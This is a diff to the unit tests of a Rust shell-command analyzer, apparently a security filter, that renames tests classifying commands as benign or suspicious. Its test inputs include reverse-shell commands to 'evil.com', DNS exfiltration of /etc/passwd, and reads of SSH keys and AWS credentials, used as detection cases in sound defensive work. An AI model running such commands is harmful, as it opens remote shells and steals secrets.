@@ -401,67 +401,67 @@ mod tests {
     ];
 
     // =================================================================
-    // Engine 1: SafeByIdentity — always benign
+    // SafeByIdentity — always benign
     // =================================================================
 
     #[test]
-    fn test_engine1_echo() {
+    fn test_safe_command_echo_is_benign() {
         assert!(analyze_command("echo", &["echo", "hello"], SENSITIVE, COMMANDS).is_none());
     }
 
     #[test]
-    fn test_engine1_ls() {
+    fn test_safe_command_ls_is_benign() {
         assert!(analyze_command("ls", &["ls", "-la"], SENSITIVE, COMMANDS).is_none());
     }
 
     #[test]
-    fn test_engine1_date() {
+    fn test_safe_command_date_is_benign() {
         assert!(analyze_command("date", &["date", "+%Y"], SENSITIVE, COMMANDS).is_none());
     }
 
     #[test]
-    fn test_engine1_whoami() {
+    fn test_safe_command_whoami_is_benign() {
         assert!(analyze_command("whoami", &["whoami"], SENSITIVE, COMMANDS).is_none());
     }
 
     // =================================================================
-    // Engine 2: BuildAndDev — always benign
+    // BuildAndDev — always benign
     // =================================================================
 
     #[test]
-    fn test_engine2_make() {
+    fn test_build_tool_make_is_benign() {
         assert!(analyze_command("make", &["make", "build"], SENSITIVE, COMMANDS).is_none());
     }
 
     #[test]
-    fn test_engine2_gcc() {
+    fn test_build_tool_gcc_is_benign() {
         assert!(
             analyze_command("gcc", &["gcc", "-o", "main", "main.c"], SENSITIVE, COMMANDS).is_none()
         );
     }
 
     // =================================================================
-    // Engine 3: TextProcessing — always benign
+    // TextProcessing — always benign
     // =================================================================
 
     #[test]
-    fn test_engine3_grep() {
+    fn test_text_tool_grep_is_benign() {
         assert!(
             analyze_command("grep", &["grep", "-r", "pattern", "."], SENSITIVE, COMMANDS).is_none()
         );
     }
 
     #[test]
-    fn test_engine3_sort() {
+    fn test_text_tool_sort_is_benign() {
         assert!(analyze_command("sort", &["sort", "file.txt"], SENSITIVE, COMMANDS).is_none());
     }
 
     // =================================================================
-    // Engine 4: PackageAndVCS — always benign
+    // PackageAndVCS — always benign
     // =================================================================
 
     #[test]
-    fn test_engine4_git() {
+    fn test_package_vcs_git_is_benign() {
         assert!(analyze_command(
             "git",
             &["git", "clone", "https://github.com/x/y"],
@@ -472,40 +472,40 @@ mod tests {
     }
 
     #[test]
-    fn test_engine4_npm() {
+    fn test_package_vcs_npm_is_benign() {
         assert!(analyze_command("npm", &["npm", "install"], SENSITIVE, COMMANDS).is_none());
     }
 
     #[test]
-    fn test_engine4_pip() {
+    fn test_package_vcs_pip_is_benign() {
         assert!(
             analyze_command("pip", &["pip", "install", "flask"], SENSITIVE, COMMANDS).is_none()
         );
     }
 
     // =================================================================
-    // Engine 5: FileOperations — benign unless sensitive path
+    // FileOperations — benign unless sensitive path
     // =================================================================
 
     #[test]
-    fn test_engine5_cp_safe() {
+    fn test_file_op_cp_safe_paths_is_benign() {
         assert!(analyze_command("cp", &["cp", "/tmp/a", "/tmp/b"], SENSITIVE, COMMANDS).is_none());
     }
 
     #[test]
-    fn test_engine5_cat_readme() {
+    fn test_file_op_cat_readme_is_benign() {
         assert!(analyze_command("cat", &["cat", "README.md"], SENSITIVE, COMMANDS).is_none());
     }
 
     #[test]
-    fn test_engine5_tar_safe() {
+    fn test_file_op_tar_safe_paths_is_benign() {
         assert!(
             analyze_command("tar", &["tar", "xf", "archive.tar.gz"], SENSITIVE, COMMANDS).is_none()
         );
     }
 
     #[test]
-    fn test_engine5_ln_ssh_suspicious() {
+    fn test_file_op_ln_ssh_key_is_suspicious() {
         let result = analyze_command("ln", &["ln", "-s", "~/.ssh", "/tmp/x"], SENSITIVE, COMMANDS);
         assert!(result.is_some());
         let analysis = result.unwrap();
@@ -513,7 +513,7 @@ mod tests {
     }
 
     #[test]
-    fn test_engine5_tar_aws_suspicious() {
+    fn test_file_op_tar_aws_creds_is_suspicious() {
         let result = analyze_command(
             "tar",
             &["tar", "czf", "out.tgz", "~/.aws/"],
@@ -526,7 +526,7 @@ mod tests {
     }
 
     #[test]
-    fn test_engine5_dd_sensitive_input() {
+    fn test_file_op_dd_sensitive_input_is_suspicious() {
         let result = analyze_command(
             "dd",
             &["dd", "if=/home/user/.ssh/id_rsa", "of=/tmp/out"],
@@ -538,7 +538,7 @@ mod tests {
     }
 
     #[test]
-    fn test_engine5_dd_safe() {
+    fn test_file_op_dd_safe_paths_is_benign() {
         assert!(analyze_command(
             "dd",
             &["dd", "if=/dev/zero", "of=/tmp/out", "bs=1M", "count=1"],
@@ -549,11 +549,11 @@ mod tests {
     }
 
     // =================================================================
-    // Engine 6: NetworkAndShell — noteworthy commands, signal-based
+    // NetworkAndShell — noteworthy commands, signal-based
     // =================================================================
 
     #[test]
-    fn test_engine6_curl_safe() {
+    fn test_network_curl_https_is_benign() {
         assert!(analyze_command(
             "curl",
             &["curl", "https://example.com"],
@@ -564,14 +564,14 @@ mod tests {
     }
 
     #[test]
-    fn test_engine6_curl_file_protocol() {
+    fn test_network_curl_file_protocol_is_suspicious() {
         let result = analyze_command("curl", &["curl", "file:///etc/passwd"], SENSITIVE, COMMANDS);
         assert!(result.is_some());
         assert_eq!(result.unwrap().rule_id, "file_protocol");
     }
 
     #[test]
-    fn test_engine6_nc_exec() {
+    fn test_network_nc_exec_flag_is_suspicious() {
         let result = analyze_command(
             "nc",
             &["nc", "-e", "/bin/sh", "evil.com", "4444"],
@@ -583,19 +583,19 @@ mod tests {
     }
 
     #[test]
-    fn test_engine6_base64_decode() {
+    fn test_network_base64_decode_is_suspicious() {
         let result = analyze_command("base64", &["base64", "-d"], SENSITIVE, COMMANDS);
         assert!(result.is_some());
         assert_eq!(result.unwrap().rule_id, "base64_decode");
     }
 
     #[test]
-    fn test_engine6_base64_encode_benign() {
+    fn test_network_base64_encode_is_benign() {
         assert!(analyze_command("base64", &["base64", "file.txt"], SENSITIVE, COMMANDS).is_none());
     }
 
     #[test]
-    fn test_engine6_sqlite3_credential_db() {
+    fn test_network_sqlite3_credential_db_is_suspicious() {
         let result = analyze_command(
             "sqlite3",
             &[
@@ -610,7 +610,7 @@ mod tests {
     }
 
     #[test]
-    fn test_engine6_sqlite3_safe() {
+    fn test_network_sqlite3_safe_path_is_benign() {
         assert!(analyze_command(
             "sqlite3",
             &["sqlite3", "/tmp/mydb.sqlite"],
@@ -621,7 +621,7 @@ mod tests {
     }
 
     #[test]
-    fn test_engine6_bash_reverse_shell() {
+    fn test_network_bash_reverse_shell_is_suspicious() {
         let result = analyze_command(
             "bash",
             &["bash", "-i", ">& /dev/tcp/evil.com/4444"],
@@ -633,12 +633,12 @@ mod tests {
     }
 
     #[test]
-    fn test_engine6_bash_safe_script() {
+    fn test_network_bash_safe_script_is_benign() {
         assert!(analyze_command("bash", &["bash", "script.sh"], SENSITIVE, COMMANDS).is_none());
     }
 
     #[test]
-    fn test_engine6_dig_dns_exfil() {
+    fn test_network_dig_dns_exfil_is_suspicious() {
         let result = analyze_command(
             "dig",
             &["dig", "$(cat /etc/passwd).evil.com"],
@@ -650,17 +650,17 @@ mod tests {
     }
 
     #[test]
-    fn test_engine6_not_noteworthy_skips() {
+    fn test_network_ping_not_noteworthy_skips() {
         // "ping" is not in COMMANDS, so engine 6 returns Unknown, falls through
         assert!(analyze_command("ping", &["ping", "google.com"], SENSITIVE, COMMANDS).is_none());
     }
 
     // =================================================================
-    // Engine 7: DangerousPatterns — cross-command catch-all
+    // DangerousPatterns — cross-command catch-all
     // =================================================================
 
     #[test]
-    fn test_engine7_unknown_tool_reverse_shell() {
+    fn test_danger_unknown_tool_reverse_shell_is_suspicious() {
         let result = analyze_command(
             "unknown_tool",
             &["unknown_tool", "/dev/tcp/evil.com/4444"],
@@ -672,7 +672,7 @@ mod tests {
     }
 
     #[test]
-    fn test_engine7_unknown_tool_file_protocol() {
+    fn test_danger_unknown_tool_file_protocol_is_suspicious() {
         let result = analyze_command(
             "custom_fetcher",
             &["custom_fetcher", "file:///etc/shadow"],
@@ -684,7 +684,7 @@ mod tests {
     }
 
     #[test]
-    fn test_engine7_unknown_tool_sensitive_path() {
+    fn test_danger_unknown_tool_sensitive_path_is_suspicious() {
         let result = analyze_command(
             "custom_tool",
             &["custom_tool", "/home/user/.ssh/id_rsa"],
@@ -696,7 +696,7 @@ mod tests {
     }
 
     #[test]
-    fn test_engine7_unknown_tool_safe() {
+    fn test_danger_unknown_tool_safe_args_is_benign() {
         // No dangerous signals → Unknown from engine 7, overall None
         assert!(analyze_command(
             "custom_tool",
@@ -712,18 +712,18 @@ mod tests {
     // =================================================================
 
     #[test]
-    fn test_no_args() {
+    fn test_command_with_no_args_is_benign() {
         assert!(analyze_command("echo", &["echo"], SENSITIVE, COMMANDS).is_none());
     }
 
     #[test]
-    fn test_empty_sensitive_patterns() {
+    fn test_file_op_empty_sensitive_patterns_is_benign() {
         // With no sensitive patterns, file ops are always benign
         assert!(analyze_command("ln", &["ln", "-s", "~/.ssh", "/tmp/x"], &[], COMMANDS).is_none());
     }
 
     #[test]
-    fn test_empty_command_patterns() {
+    fn test_danger_catches_file_protocol_without_command_patterns() {
         // With no command patterns, engine 6 skips; engine 7 catches file://
         let result = analyze_command("curl", &["curl", "file:///etc/passwd"], SENSITIVE, &[]);
         // Engine 4/5 don't match curl; engine 6 skips (empty command_patterns);
@@ -733,7 +733,7 @@ mod tests {
     }
 
     #[test]
-    fn test_flags_skipped_in_file_ops() {
+    fn test_file_op_flags_not_treated_as_paths() {
         // Flags should not be treated as file paths
         assert!(
             analyze_command("cp", &["cp", "-r", "/tmp/a", "/tmp/b"], SENSITIVE, COMMANDS).is_none()
@@ -741,7 +741,7 @@ mod tests {
     }
 
     #[test]
-    fn test_path_normalization_traversal() {
+    fn test_file_op_dotdot_traversal_normalized_and_caught() {
         // Path traversal to sensitive dir
         let result = analyze_command(
             "cat",
